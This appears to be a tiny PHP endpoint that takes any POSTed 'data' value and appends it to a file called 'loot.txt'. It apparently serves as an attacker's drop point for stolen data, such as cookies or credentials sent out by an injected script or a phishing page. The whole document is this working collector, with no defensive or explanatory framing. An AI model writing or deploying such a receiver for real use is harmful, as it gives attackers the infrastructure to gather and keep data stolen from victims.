<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $data = $_REQUEST['data'];
  if (empty($data)) {
    echo "data is empty";
  } else {
    file_put_contents('loot.txt', $data.'',FILE_APPEND);
  }
}
?>
